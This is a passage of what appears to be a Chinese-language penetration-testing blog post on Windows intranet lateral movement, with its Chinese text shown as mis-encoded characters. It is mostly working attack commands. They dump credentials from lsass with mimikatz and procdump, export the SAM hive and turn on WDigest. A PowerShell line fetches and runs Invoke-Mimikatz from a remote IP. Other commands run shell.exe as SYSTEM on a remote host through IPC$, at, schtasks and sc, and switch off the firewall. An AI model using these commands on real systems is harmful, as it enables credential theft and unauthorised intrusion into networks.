´å·¥å…·è¿›è¡Œçˆ†ç ´<br><span class="hljs-number">2</span>.åˆ©ç”¨<span class="hljs-built_in">PTH</span>(å“ˆå¸Œä¼ é€’æ”»å‡»)è¿›è¡Œå†…ç½‘æ¨ªå‘<br></code></pre></td></tr></table></figure><h3 id="MimikatzæŠ“å–å¯†ç "><a href="#MimikatzæŠ“å–å¯†ç " class="headerlink" title="MimikatzæŠ“å–å¯†ç "></a>MimikatzæŠ“å–å¯†ç </h3><p>é€šè¿‡ä»lsass.exeè¿›ç¨‹ä¸­è¯»å–å½“å‰ç™»å½•ç³»ç»Ÿç”¨æˆ·çš„å¯†ç ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p>å½“ç³»ç»Ÿå®‰è£…äº†kb2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwin10å’Œwin2012æ—¶ï¼Œé»˜è®¤ç¦æ­¢åœ¨å†…å­˜ä¸­ä¿å­˜æ˜æ–‡å¯†ç ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ï¼ˆæ‰“å¼€Wdigestï¼‰ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug <span class="hljs-comment">//æå‡è‡³debugæƒé™</span><br>sekurlsa::logonpasswords <span class="hljs-comment">//æŠ“å–å¯†ç </span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503212125335.png" alt="image-20250321212500091"></p><h3 id="Procdump"><a href="#Procdump" class="headerlink" title="Procdump"></a>Procdump</h3><p>è¿™æ˜¯å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·ï¼ˆä¸æ˜“è¢«æ£€æµ‹åˆ°ï¼Œæ€è½¯ä¸ä¼šè¿›è¡Œæ‹¦æˆªï¼‰ï¼Œèƒ½å¤Ÿå°†ç›®æ ‡lsassæ–‡ä»¶å¯¼å‡ºï¼Œç„¶åå†æ¬¡åˆ©ç”¨mimikatzå¯¼å‡ºé‡Œé¢çš„hash.</p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503212142356.png" alt="image-20250321214217246"></p><p>ç„¶æ˜¯ä½¿ç”¨mimikatzè¿›è¡Œå¯¼å‡ºé‡Œé¢çš„hash(è¿™é‡Œä¸éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œmimikatz)</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> ç›®å½•\lsass.dmp       <span class="hljs-comment">// å°†å¯¼å‡ºçš„lsass.dmpè½½å…¥åˆ°mimikatzä¸­</span><br>sekurlsa<span class="hljs-type">::logonpasswords</span> <span class="hljs-literal">full</span>                 <span class="hljs-comment">// è·å–å¯†ç </span><br></code></pre></td></tr></table></figure><p>â€‹    <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503212146273.png" alt="image-20250321214605200"></p><h3 id="åˆ©ç”¨samå’Œsystemæ–‡ä»¶"><a href="#åˆ©ç”¨samå’Œsystemæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨samå’Œsystemæ–‡ä»¶"></a>åˆ©ç”¨samå’Œsystemæ–‡ä»¶</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hive<br>reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><p>é€šè¿‡ç®¡ç†å‘˜æƒé™è·å–samå’Œsystemæ–‡ä»¶ï¼Œç„¶åé€šè¿‡mimikatzè·å–è´¦æˆ·çš„å“ˆå¸Œå€¼ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503212238502.png" alt="image-20250321223856072"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive<br></code></pre></td></tr></table></figure><p>  <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503212241669.png" alt="image-20250321224114556"></p><h3 id="powershellè„šæœ¬"><a href="#powershellè„šæœ¬" class="headerlink" title="powershellè„šæœ¬"></a>powershellè„šæœ¬</h3><p>ä½¿ç”¨powershellåŠ è½½mimikatzæ¨¡å—æ¥è·å–å¯†ç ã€‚</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">powershell -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;</span>http:<span class="hljs-comment">//192.168.29.157:8081/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span><br></code></pre></td></tr></table></figure><h3 id="windowså¯†ç å“ˆå¸Œçš„ç ´è§£æ–¹æ³•ï¼š"><a href="#windowså¯†ç å“ˆå¸Œçš„ç ´è§£æ–¹æ³•ï¼š" class="headerlink" title="windowså¯†ç å“ˆå¸Œçš„ç ´è§£æ–¹æ³•ï¼š"></a>windowså¯†ç å“ˆå¸Œçš„ç ´è§£æ–¹æ³•ï¼š</h3><h4 id="ophcrackå·¥å…·"><a href="#ophcrackå·¥å…·" class="headerlink" title="ophcrackå·¥å…·"></a>ophcrackå·¥å…·</h4><p>ophcrackä¸‹è½½åœ°å€ï¼š<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a></p><p>ophcrackæä¾›çš„å½©è™¹è¡¨ä¸‹è½½åœ°å€ï¼š<a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a></p><h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>å¸¸ç”¨çš„ï¼š</p><ul><li>-m 1000ï¼šNTLM</li><li>-m 5600ï¼šNet-NTLMv2</li><li>-m 5500ï¼šNetNTLMv1 / NetNTLMv1+ESS</li><li>-m 0ï¼šMD5</li><li>-m 2500ï¼šWPA/PSK</li></ul><p>é«˜æƒé™ä¸‹ åœ¨æ³¨å†Œè¡¨ä¸­æ‰“å¼€wdigest</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="hljs-regexp">/v UseLogonCredential /</span>t REG_DWORD <span class="hljs-regexp">/d 1 /</span>f           <span class="hljs-regexp">//</span> å¼€å¯Wdigest Auth<br> <br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="hljs-regexp">/v UseLogonCredential /</span>t REG_DWORD <span class="hljs-regexp">/d 0 /</span>f           <span class="hljs-regexp">//</span> å…³é—­Wdigest Auth<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨windowsè¿œç¨‹è¿æ¥å‘½ä»¤"><a href="#åˆ©ç”¨windowsè¿œç¨‹è¿æ¥å‘½ä»¤" class="headerlink" title="åˆ©ç”¨windowsè¿œç¨‹è¿æ¥å‘½ä»¤"></a>åˆ©ç”¨windowsè¿œç¨‹è¿æ¥å‘½ä»¤</h2><p>å½“æˆ‘ä»¬æ‹¿åˆ°æ˜æ–‡å¯†ç æˆ–è€…hashå€¼æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡windowsè‡ªå¸¦çš„è¿œç¨‹è¿æ¥å‘½ä»¤å¦‚IPCè¿æ¥åˆ°ç›®æ ‡çš„ä¸»æœºä¸Šï¼Œæˆ–è€…é€šè¿‡hashæ‰“ä¸€ä¸ªPTHæ¨ªå‘ã€‚</p><h3 id="å»ºç«‹IPCè¿æ¥"><a href="#å»ºç«‹IPCè¿æ¥" class="headerlink" title="å»ºç«‹IPCè¿æ¥"></a>å»ºç«‹IPCè¿æ¥</h3><p>ä¸ºäº†è®©è¿›ç¨‹ä¹‹é—´é€šä¿¡è€Œå»ºç«‹çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›ç”¨æˆ·åå’Œå¯†ç å¯ä»¥å’Œç›®æ ‡ä¸»æœºå»ºç«‹è¿æ¥ï¼Œé€šè¿‡è¿™ä¸ªåŠ å¯†é€šé“èƒ½å¤Ÿè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œè®¿é—®ç‰¹å®šç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯ï¼Œä¸‹è½½æ–‡ä»¶ç­‰æ“ä½œã€‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\&lt;ç›®æ ‡ä¸»æœºçš„ipåœ°å€&gt;\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:<span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.29.188\ipc$ <span class="hljs-string">&quot;&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> <span class="hljs-comment">//æŸ¥çœ‹è¿æ¥çš„æƒ…å†µ</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221425011.png" alt="image-20250322142504829"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">dir \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span>\c$  <span class="hljs-regexp">//</span>æŸ¥çœ‹cç›˜ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯<br>dir \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span>\c$\<span class="hljs-string">&quot;Program Files&quot;</span>  <span class="hljs-regexp">//</span>æŸ¥çœ‹cç›˜ä¸‹çš„Program Filesç›®å½•ä¸‹çš„ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221434464.png" alt="image-20250322143447376"></p><p>é™¤äº†ä¸Šé¢çš„ æˆ‘ä»¬è¿˜å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœºä¸Š ç„¶åå¯ä»¥é…ç½®å†™ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡è§¦å‘é‚£ä¸ªexeæ–‡ä»¶ã€‚</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">copy</span> æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ \\ç›®æ ‡ä¸»æœº<span class="hljs-built_in">ip</span>\c$ <span class="hljs-comment">//å°†æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºçš„Cç›˜ä¸‹</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221446433.png" alt="image-20250322144603299"></p><p>é€šè¿‡taskliståˆ—å‡ºç›®æ ‡ä¸»æœºè¿è¡Œçš„è¿›ç¨‹ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/S</span> 192.168.29.188 <span class="hljs-string">/U</span> Administrator <span class="hljs-string">/P</span> <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221449127.png" alt="image-20250322144940066"></p><p>å¼€å¯IPCçš„å‰ææ¡ä»¶ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.ç›®æ ‡ä¸»æœºçš„<span class="hljs-number">139</span>å’Œ<span class="hljs-number">445</span>ç«¯å£å¼€å¯<br><span class="hljs-attribute">2</span>.ç›®æ ‡ä¸»æœºç®¡ç†å‘˜å¼€å¯äº†ipc$é»˜è®¤å…±äº«<br></code></pre></td></tr></table></figure><p>åˆ é™¤ipcè¿æ¥çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">net use \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> <span class="hljs-regexp">/del /y</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221455941.png" alt="image-20250322145549828"></p><h2 id="åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘"><a href="#åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘" class="headerlink" title="åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘"></a>åˆ©ç”¨è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘</h2><p>è¿™é‡Œæœ‰atå’Œschtasksä¸¤ç§å‘½ä»¤ï¼Œatçš„è¯å†windows7ä¹‹å‰(åŒ…æ‹¬win7)ä½¿ç”¨ï¼Œå¾€åå°±ä¸é€‚ç”¨äº†ï¼Œè€Œschtaskséƒ½é€‚ç”¨ã€‚</p><h3 id="åˆ©ç”¨atåˆ›å»ºè®¡åˆ’ä»»åŠ¡"><a href="#åˆ©ç”¨atåˆ›å»ºè®¡åˆ’ä»»åŠ¡" class="headerlink" title="åˆ©ç”¨atåˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>åˆ©ç”¨atåˆ›å»ºè®¡åˆ’ä»»åŠ¡</h3><p>æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.é¦–å…ˆå’Œç›®æ ‡ä¸»æœºå»ºç«‹èµ·ä¸€ä¸ªé€šé“è¿æ¥ æ¯”å¦‚IPCè¿æ¥<br><span class="hljs-number">2</span>.é€šè¿‡net time \\<span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> <span class="hljs-regexp">//</span>æŸ¥çœ‹ç›®æ ‡ä¸»æœºçš„æ—¶é—´ä¿¡æ¯  <br><span class="hljs-number">3</span>.å°†ç”Ÿæˆçš„exeæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œé€šè¿‡è®¾ç½®å®šæ—¶ä»»åŠ¡æ¥è§¦å‘è¿™ä¸ªexeæ–‡ä»¶<br><span class="hljs-number">4</span>.æœ€åéœ€è¦å°†è¿™ä¸ªå®šæ—¶ä»»åŠ¡ç»™åˆ é™¤æ‰<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221544226.png" alt="image-20250322154429133"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221545829.png" alt="image-20250322154502710"></p><p>ä¸‹é¢å°±æ˜¯é€šè¿‡atå¢åŠ ä¸€æ¡æ‰§è¡Œshell.exeçš„å‘½ä»¤ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.29.188</span> <span class="hljs-number">15</span>:<span class="hljs-number">48</span>:<span class="hljs-number">00</span> c:\shell.exe<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221550287.png" alt="image-20250322155001215"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221553826.png" alt="image-20250322155302703"></p><p>æœ€ååˆ é™¤å¯¹åº”çš„è®¡åˆ’ä»»åŠ¡ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.29.188</span> <span class="hljs-number">1</span> /delete<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221555535.png" alt="image-20250322155553377"></p><p>è¿˜å¯ä»¥é€šè¿‡ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åç”±äºæ˜¯æ— å›æ˜¾çš„ï¼Œå°†è¾“å‡ºç»“æœè¾“å‡ºåˆ°ç›®æ ‡ç³»ç»Ÿçš„ç‰¹å®šç›®å½•ä¸‹ã€‚</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">at</span> \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">29</span>.<span class="hljs-number">188</span> å…·ä½“æ—¶é—´ <span class="hljs-built_in">cmd</span>.exe /c &quot;<span class="hljs-built_in">ipconfig</span> &gt; xxxxx\result.txt&quot;<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨schtasksåˆ›å»ºè®¡åˆ’ä»»åŠ¡"><a href="#åˆ©ç”¨schtasksåˆ›å»ºè®¡åˆ’ä»»åŠ¡" class="headerlink" title="åˆ©ç”¨schtasksåˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>åˆ©ç”¨schtasksåˆ›å»ºè®¡åˆ’ä»»åŠ¡</h3><p>schtasksæ¯”èµ·atæ›´åŠ çš„å¤æ‚ï¼Œèƒ½å¤Ÿè®¾å®šå†ä¸€å®šçš„å‘¨æœŸå†…è¿è¡Œï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œç„¶åè¿™ä¸ªè®¡åˆ’ä»»åŠ¡äº¤ç”±ask Scheduler è°ƒç”¨ã€‚</p><p>æ€è·¯çš„è¯è·Ÿä¸Šé¢atçš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡å†è®¡åˆ’ä»»åŠ¡åˆ›å»ºè¿™é‡Œä¼šæ›´åŠ çš„å¤æ‚ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s 192.168.29.188 /tn <span class="hljs-built_in">test</span> /u Administrator /p <span class="hljs-string">&quot;&quot;</span> /sc minute /mo 1 /tr c:\shell.exe /ru system /f<br><br>//è¿™æ®µå‘½ä»¤çš„æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ªåä¸º<span class="hljs-built_in">test</span>çš„è®¡åˆ’ä»»åŠ¡ï¼Œ/sc minute /mo 1 æ˜¯æ²¡ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ å¦‚æœ/mo 2 åˆ™æ˜¯æ²¡ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ æ‰§è¡Œçš„å†…å®¹æ˜¯cç›˜ä¸‹çš„shell.exeæ–‡ä»¶ å¹¶ä¸”æ˜¯ä»¥systemæƒé™æ¥è¿è¡Œçš„<br><br>schtasks /delete /s 192.168.29.188 /tn <span class="hljs-string">&quot;test&quot;</span> /f   //åˆ é™¤è®¡åˆ’ä»»åŠ¡<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ schtasksé™¤äº†è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæœ¨é©¬æ–‡ä»¶ï¼Œè¿˜èƒ½è¿›è¡Œç³»ç»Ÿæ‰§è¡Œï¼Œå°†ç»“æœè¾“å‡ºåˆ°ç‰¹å®šçš„æ–‡ä»¶ç›®å½•ä¸‹ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/create /</span>s <span class="hljs-number">192.168</span>.<span class="hljs-number">29.188</span> <span class="hljs-regexp">/tn test1 /</span>sc minute <span class="hljs-regexp">/mo 1 /</span>tr <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c &#x27;whoami &gt; C:\xxxxxxx\result.txt&#x27;&quot;</span> <span class="hljs-regexp">/ru system /</span>f<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨shctasksä¼šç•™ä¸‹æ—¥å¿—ï¼Œå­˜æ”¾å†<strong>C:\Windows\Tasks\SchedLgU.txt</strong>æ–‡ä»¶ä¸­ï¼ˆè€ç³»ç»ŸWindows XP / Windows Server 2003 åŠæ›´æ—©ç‰ˆæœ¬æ˜¯è¿™æ ·çš„ï¼‰ï¼Œä½†æ˜¯æ–°çš„ç³»ç»Ÿ(Windows Vista åŠæ›´æ–°ç‰ˆæœ¬)ä¸å†ä½¿ç”¨ï¼Œè®¡åˆ’ä»»åŠ¡çš„æ—¥å¿—è½¬ç§»åˆ°äº†Event Viewer(äº‹ä»¶æŸ¥çœ‹å™¨)ã€‚</p><h2 id="åˆ›å»ºWindowsæœåŠ¡æ¥è¿›è¡Œæ¨ªå‘"><a href="#åˆ›å»ºWindowsæœåŠ¡æ¥è¿›è¡Œæ¨ªå‘" class="headerlink" title="åˆ›å»ºWindowsæœåŠ¡æ¥è¿›è¡Œæ¨ªå‘"></a>åˆ›å»ºWindowsæœåŠ¡æ¥è¿›è¡Œæ¨ªå‘</h2><p>éœ€è¦çš„å‰ææ¡ä»¶ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.ç”±äºéœ€è¦åˆ›å»ºæœåŠ¡ï¼Œå› æ­¤éœ€è¦æ˜¯ç®¡ç†å‘˜çš„æƒé™<br>2.éœ€è¦å’Œç›®æ ‡ä¸»æœºå»ºç«‹ipcè¿æ¥<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨scè¿›è¡Œå†…ç½‘æ¨ªå‘ï¼Œå®ƒçš„æ€è·¯è·Ÿåˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„æ€è·¯å·®ä¸å¤šï¼Œåªä¸è¿‡è¿™ä¸ªæ˜¯é€šè¿‡scåˆ›å»ºä¸€ä¸ªæ¶æ„çš„æœåŠ¡ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡é‡å¯è¿™ä¸ªæ¶æ„çš„æœåŠ¡æ¥è¿è¡Œæˆ‘ä»¬çš„exeæ–‡ä»¶ã€‚</p><p>åˆ©ç”¨æ‰‹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.è®©è·³æ¿æœºå’Œå†…ç½‘ipè¿›è¡Œä¸€ä¸ªipcçš„è¿æ¥<br><span class="hljs-number">2</span>.å°†msfç”Ÿæˆçš„<span class="hljs-keyword">exe</span>æ–‡ä»¶é€šè¿‡ipcä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Š<br><span class="hljs-number">3</span>.é€šè¿‡åˆ›å»ºä¸€ä¸ªæœåŠ¡ æŒ‡å®šä¸€ä¸‹ä¸Šä¼ çš„<span class="hljs-keyword">exe</span>æ–‡ä»¶çš„è·¯å¾„ä¿¡æ¯<br><span class="hljs-number">4</span>.é‡å¯æˆ‘ä»¬åˆ›å»ºçš„æœåŠ¡ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>å‰é¢è¿æ¥ipcçš„å°±ä¸æ¼”ç¤ºäº†ï¼Œè¿™é‡Œç›´æ¥æ¼”ç¤ºé€šè¿‡scåˆ›å»ºä¸€ä¸ªæœåŠ¡ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\[ä¸»æœºåæˆ–è€…ip] create [æœåŠ¡çš„åå­—] <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;[è·¯å¾„ä¿¡æ¯]&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">29</span>.<span class="hljs-number">188</span> create hack <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">29</span>.<span class="hljs-number">188</span> start hack<br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221800527.png" alt="image-20250322180046291"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202503221804129.png" alt="image-20250322180359969"></p><p>åˆ é™¤åˆ›å»ºçš„æœåŠ¡ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\192.168.29.188</span> <span class="hljs-keyword">delete</span> hack<br></code></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œæ¥è®²é˜²ç«å¢™ç»™å…³é—­æ‰ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">29</span>.<span class="hljs-number">188</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">29</span>.<span class="hljs-number">188</span> start unablefirewall<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨PsExecè¿›è¡Œæ¨ªå‘æ¸—é€"><a href="#åˆ©ç”¨PsExecè¿›è¡Œæ¨ªå‘æ¸—é€" class="headerlink" title="åˆ©ç”¨PsExecè¿›è¡Œæ¨ªå‘æ¸—é€"></a>åˆ©ç”¨PsExecè¿›è¡Œæ¨ªå‘æ¸—é€</h2><p>ä»€ä¹ˆæ˜¯psexec:</p><p>psexecæ˜¯windowsä¸‹çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤å·¥å…·(è¿œç¨‹è¿è¡Œè¿›ç¨‹)ï¼Œæ˜¯windowsæä¾›çš„å·¥å…·ï¼ŒåŠ åœ¨ç™½åå•ä¸­(ä¸ä¼šè¢«æ€æ¯’è½¯ä»¶æŸ¥æ€)ï¼Œä¸éœ€è¦å¯¹æ–¹å¼€å¯3389ç«¯å£ï¼Œéœ€è¦ç›®æ ‡å¼€å¯admin$å…±äº«ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å¼€å¯çš„ï¼Œå¦‚æœå¯¹æ–¹å¼€å¯é˜²ç«å¢™çš„è¯ä¸€èˆ¬æ˜¯ç”¨ä¸äº†çš„(445ç«¯å£è¢«é˜²ç«å¢™ç»™æ‹¦äº†)ã€‚</p><p>psexecçš„åŸç†ï¼š</p><p>è·Ÿä¸Šé¢çš„scæ¨ªå‘æ€è·¯å·®ä¸å¤šï¼Œé¦–å…ˆå’Œç›®æ ‡ä¸»æœºå»ºç«‹ipcè¿æ¥ï¼Œç„¶åå‘ç›®æ ‡ä¸»æœºé‡Šæ”¾psexecsvc.exeæ–‡ä»¶ï¼Œé€šè¿‡scå†ç›®æ 